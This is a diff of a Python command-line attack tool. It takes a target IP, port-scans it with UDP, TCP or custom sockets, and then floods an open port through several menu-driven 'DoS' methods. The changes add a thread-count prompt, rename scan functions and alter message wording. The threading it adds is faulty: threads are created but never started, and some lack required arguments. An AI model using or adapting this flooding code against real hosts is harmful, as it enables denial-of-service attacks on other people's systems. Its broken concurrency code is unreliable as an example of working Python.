@@ -6,7 +6,7 @@ import json
 from colorama import Fore, Back, Style
 ips = {
 
-    "Your collection of ": "IPs"
+        "Your collection of ": "IPs"
 }
 
 f = ips.values()
@@ -68,10 +68,10 @@ if respP == "n":
     print(Fore.RED + " /{<->}\ Please enter " + Fore.BLUE + "N" + Fore.RED + " for No! /{<->}\ ")
     print(Fore.RESET)
 if respP == "N":
-    print(Fore.RED + " /{<->}\ You choose " + Fore.BLUE + "No" + Fore.RED + " /{<->}\ ")
+    print(Fore.RED + " /{<->}\ You choosed " + Fore.BLUE + "No" + Fore.RED + " /{<->}\ ")
     print(Fore.RESET)
 if respP == "Y":
-    print(Fore.GREEN + " /{<+>}\ You choose " + Fore.BLUE + "Yes" + Fore.GREEN + " /{<+>}\ ")
+    print(Fore.GREEN + " /{<+>}\ You choosed " + Fore.BLUE + "Yes" + Fore.GREEN + " /{<+>}\ ")
     print(Fore.RESET)
     time.sleep(1)
     print(Fore.YELLOW + ' /{<!>}\ This is the IP ' + Fore.MAGENTA + ip + Fore.YELLOW + ' for port scan /{<!>}\ ')
@@ -96,8 +96,13 @@ if respP == "Y":
     """
     {<[?]>} Choose a scan method >}> """ + Fore.MAGENTA)
     print(Fore.RESET)
+    thip = input(Fore.RED + " {<[?]>} Enter threads >}> " + Fore.BLUE)
+    print(Fore.RESET)
+    print(Fore.YELLOW + " /{<!>}\ You entered " + Fore.BLUE + thip + Fore.YELLOW + "threads /{<!>}\ ")
+    print(Fore.RESET)
+    thipi = int(thip)
     if chose == '1':
-        print(Fore.YELLOW + " /{<!>}\ You choose "+ Fore.CYAN + "socket.AF_INET, socket.SOCK_DGRAM"+ Fore.YELLOW + " scan method /{<!>}\ ")
+        print(Fore.YELLOW + " /{<!>}\ You choosed "+ Fore.CYAN + "socket.AF_INET, socket.SOCK_DGRAM"+ Fore.YELLOW + " scan method /{<!>}\ ")
         print(Fore.RESET)
         time.sleep(1)
         def portscan(port1):
@@ -114,12 +119,14 @@ if respP == "Y":
                 print(Fore.RESET)
             else:
                 continue
+        for i in range(thipi):
+            threading.Thread(target=portscan)
         portscan(port1)
     if chose == '2':
-        print(Fore.YELLOW + " /{<!>}\ You choose " + Fore.CYAN + "socket.AF_INET, socket.SOCK_STREAM" + Fore.YELLOW + "scan method /{<!>}\ ")
+        print(Fore.YELLOW + " /{<!>}\ You choosed " + Fore.CYAN + "socket.AF_INET, socket.SOCK_STREAM" + Fore.YELLOW + "scan method /{<!>}\ ")
         print(Fore.RESET)
         time.sleep(1)
-        def portscan(port1):
+        def portscan1(port1):
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 sock.connect((ip, port1))
@@ -127,19 +134,21 @@ if respP == "Y":
             except:
                 return False
         for port1 in range(rfi, rli):
-            result = portscan(port1)
+            result = portscan1(port1)
             if result:
                 print(Fore.GREEN + " /<+>\ Port {} is open!".format(port1) + Fore.GREEN + ' /<+>\ ')
                 print(Fore.RESET)
             else:
                 continue
-        portscan(port1)
+        for i in range(thipi):
+            threading.Thread(target=portscan1)
+        portscan1(port1)
     if chose == '3':
-        print(Fore.YELLOW + " /{<!>}\ You choose " + Fore.CYAN + "custom" + Fore.YELLOW + " scan method /{<!>}\ ")
+        print(Fore.YELLOW + " /{<!>}\ You choosed " + Fore.CYAN + "custom" + Fore.YELLOW + " scan method /{<!>}\ ")
         time.sleep(1)
         cus = input(Fore.RED + " {<[?]>} Enter a socket method " + Fore.BLUE + "[example: socket.AF_INET, socket.SOCK_STREAM]" + Fore.RED + " >}> " + Fore.BLUE)
         print(Fore.RESET)
-        def portscan(port1):
+        def portscan2(port1):
             try:
                 sock = socket.socket(cus)
                 sock.connect((ip, port1))
@@ -147,13 +156,15 @@ if respP == "Y":
             except:
                 return False
         for port1 in range(rfi, rli):
-            result = portscan(port1)
+            result = portscan2(port1)
             if result:
                 print(Fore.GREEN + " /<+>\ Port {} is open!".format(port1) + Fore.GREEN + ' /<+>\ ')
                 print(Fore.RESET)
             else:
                 continue
-        portscan(port1)
+        for i in range(thipi):
+            threading.Thread(target=portscan2)
+        portscan2(port1)
 port = input(Fore.RED + " {<[?]>} Target open port >}> " + Fore.BLUE)
 print(Fore.RESET)
 print(Fore.YELLOW + ' /{<!>}\ Open port is ' + Fore.BLUE + port + Fore.YELLOW + ' /{<!>}\ ')
@@ -201,7 +212,7 @@ chooose = input(Fore.YELLOW + """
 {<[?]>} Choose DOS method >}> """)
 print(Fore.RESET)
 if chooose == '1':
-    print(Fore.YELLOW + " /{<!>}\ You choose " + Fore.CYAN + "socket.AF_INET, socket.SOCK_DGRAM"+ Fore.YELLOW + " Dos method /{<!>}\ ")
+    print(Fore.YELLOW + " /{<!>}\ You choosed " + Fore.CYAN + "socket.AF_INET, socket.SOCK_DGRAM"+ Fore.YELLOW + " Dos method /{<!>}\ ")
     print(Fore.RESET)
     def dos(packet):
         client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -218,7 +229,7 @@ for i in range(thi):
     threading.Thread(target=dos)
     dos(bytearray(byi))
 if chooose == '2':
-    print(Fore.YELLOW + " /{<!>}\ You choose " + Fore.CYAN + "socket.AF_INET, socket.SOCK_STREAM" + Fore.YELLOW + " DoS method /{<!>}\ ")
+    print(Fore.YELLOW + " /{<!>}\ You choosed " + Fore.CYAN + "socket.AF_INET, socket.SOCK_STREAM" + Fore.YELLOW + " DoS method /{<!>}\ ")
     def dos2(packet):
         client1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         x = 0
@@ -234,7 +245,7 @@ for i in range(thi):
     threading.Thread(target=dos2)
     dos2(bytearray(byi))
 if chooose == '3':
-    print(Fore.YELLOW + " /{<!>}\ You choose " + Fore.CYAN + "custom" + Fore.YELLOW + " DoS method /{<!>}\ ")
+    print(Fore.YELLOW + " /{<!>}\ You choosed " + Fore.CYAN + "custom" + Fore.YELLOW + " DoS method /{<!>}\ ")
     time.sleep(1)
     chooooose = input(Fore.YELLOW + " {<[?]>} Enter DoS method " + Fore.CYAN + "[example socket.AF_INET, socket.SOCK_STREAM]" + Fore.YELLOW + " >}> " + Fore.CYAN)
     def dos3(packet):
